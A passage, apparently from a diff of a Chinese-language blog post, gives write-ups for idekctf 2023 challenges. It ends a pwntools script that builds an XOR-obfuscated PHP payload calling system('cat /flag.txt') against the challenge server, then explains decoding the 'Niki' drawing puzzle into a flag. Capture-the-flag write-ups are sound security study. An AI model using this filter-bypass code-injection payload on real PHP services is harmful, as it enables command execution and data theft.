+</span></span><span class="line"><span class="cl"><span class="n">phpchr</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span><span class="sa">f</span><span class="s2">&#34;((&#39;[&#39;^</span><span class="si">{</span><span class="n">num</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="si">}</span><span class="s2">.&#39;&#39;).(&#39;[&#39;^</span><span class="si">{</span><span class="n">num</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span><span class="si">}</span><span class="s2">.&#39;&#39;).(&#39;[&#39;^&#39;)&#39;))(</span><span class="si">{</span><span class="n">num</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">x</span><span class="p">))</span><span class="si">}</span><span class="s2">)&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">phpstr</span> <span class="o">=</span> <span class="k">lambda</span> <span class="nb">str</span><span class="p">:</span><span class="s1">&#39;.&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">phpchr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;(</span><span class="si">{</span><span class="n">phpstr</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">)(</span><span class="si">{</span><span class="n">phpstr</span><span class="p">(</span><span class="s1">&#39;cat /flag.txt&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">)&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;phpfun.chal.idek.team&#39;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Input script: &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><h3 id="niki">Niki:</h3>
+<p>这道题是一个类似 Scratch 的东西，用附件里面的程序打开 <code>german_scrambled.pas</code> 就可以加载题目程序了：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://pics.kdxcxs.com:4433/images/2023/01/17/20230117131403.png"
+        data-srcset="https://pics.kdxcxs.com:4433/images/2023/01/17/20230117131403.png, https://pics.kdxcxs.com:4433/images/2023/01/17/20230117131403.png 1.5x, https://pics.kdxcxs.com:4433/images/2023/01/17/20230117131403.png 2x"
+        data-sizes="auto"
+        alt="https://pics.kdxcxs.com:4433/images/2023/01/17/20230117131403.png"
+        title="https://pics.kdxcxs.com:4433/images/2023/01/17/20230117131403.png" /></p>
+<p>尝试运行之后发现这个程序有很多都是向下走的指令，但是默认那个机器人在左下角，再往下就会报错，而且初始的 Material（就相当于颜料数量）为0，画不了图案，所以点击左上角的格子按钮调整一下：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://pics.kdxcxs.com:4433/images/2023/01/17/20230117131416.png"
+        data-srcset="https://pics.kdxcxs.com:4433/images/2023/01/17/20230117131416.png, https://pics.kdxcxs.com:4433/images/2023/01/17/20230117131416.png 1.5x, https://pics.kdxcxs.com:4433/images/2023/01/17/20230117131416.png 2x"
+        data-sizes="auto"
+        alt="https://pics.kdxcxs.com:4433/images/2023/01/17/20230117131416.png"
+        title="https://pics.kdxcxs.com:4433/images/2023/01/17/20230117131416.png" /></p>
+<p>然后就会发现机器人会画很多东西出来，比较乱，而且后面还是会到边界报错，于是尝试一个函数一个函数跑：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://pics.kdxcxs.com:4433/images/2023/01/17/20230117131440.png"
+        data-srcset="https://pics.kdxcxs.com:4433/images/2023/01/17/20230117131440.png, https://pics.kdxcxs.com:4433/images/2023/01/17/20230117131440.png 1.5x, https://pics.kdxcxs.com:4433/images/2023/01/17/20230117131440.png 2x"
+        data-sizes="auto"
+        alt="https://pics.kdxcxs.com:4433/images/2023/01/17/20230117131440.png"
+        title="https://pics.kdxcxs.com:4433/images/2023/01/17/20230117131440.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://pics.kdxcxs.com:4433/images/2023/01/17/20230117131447.png"
+        data-srcset="https://pics.kdxcxs.com:4433/images/2023/01/17/20230117131447.png, https://pics.kdxcxs.com:4433/images/2023/01/17/20230117131447.png 1.5x, https://pics.kdxcxs.com:4433/images/2023/01/17/20230117131447.png 2x"
+        data-sizes="auto"
+        alt="https://pics.kdxcxs.com:4433/images/2023/01/17/20230117131447.png"
+        title="https://pics.kdxcxs.com:4433/images/2023/01/17/20230117131447.png" /></p>
+<p>可以看到 <code>h;</code> 打出了一个大写的 P，然后挨个把文件里面的函数都运行一遍就有了下面的：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="nx">h</span> <span class="o">-&gt;</span> <span class="nx">P</span>
+</span></span><span class="line"><span class="cl"><span class="nx">o</span> <span class="o">-&gt;</span> <span class="nx">S</span>
+</span></span><span class="line"><span class="cl"><span class="nx">brackl</span> <span class="o">-&gt;</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl"><span class="nx">a</span> <span class="o">-&gt;</span> <span class="nx">O</span>
+</span></span><span class="line"><span class="cl"><span class="nx">v</span> <span class="o">-&gt;</span> <span class="nx">E</span>
+</span></span><span class="line"><span class="cl"><span class="nx">u</span> <span class="o">-&gt;</span> <span class="nx">I</span>
+</span></span><span class="line"><span class="cl"><span class="nx">brackr</span> <span class="o">-&gt;</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">q</span> <span class="o">-&gt;</span> <span class="nx">D</span>
+</span></span><span class="line"><span class="cl"><span class="nx">p</span> <span class="o">-&gt;</span> <span class="nx">K</span>
+</span></span><span class="line"><span class="cl"><span class="nx">l</span> <span class="o">-&gt;</span> <span class="nx">T</span>
+</span></span></code></pre></div><p><code>PS(OEI)DKT</code> idek前缀都在，似乎就是 flag 了，简单处理一下得到 <code>idek{stop}</code></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2023-01-17</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://blog.kdxcxs.com:4433/posts/wp/idekctf-2023-wp/" data-title="idekctf 2023 wp" data-hashtags="ctf,wp"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://blog.kdxcxs.com:4433/posts/wp/idekctf-2023-wp/" data-hashtag="ctf"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Hacker News" data-sharer="hackernews" data-url="https://blog.kdxcxs.com:4433/posts/wp/idekctf-2023-wp/" data-title="idekctf 2023 wp"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="https://blog.kdxcxs.com:4433/posts/wp/idekctf-2023-wp/" data-title="idekctf 2023 wp"><i data-svg-src="/lib/simple-icons/icons/line.min.svg"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://blog.kdxcxs.com:4433/posts/wp/idekctf-2023-wp/" data-title="idekctf 2023 wp"><i class="fab fa-weibo fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/ctf/">ctf</a>,&nbsp;<a href="/tags/wp/">wp</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/wp/hack.lu-2022-htpl-wp/" class="prev" rel="prev" title="hack.lu 2022 HTPL wp"><i class="fas fa-angle-left fa-fw"></i>hack.lu 2022 HTPL wp</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.110.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">kdxcxs</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.zh.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"search":{"highlightTag":"em","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
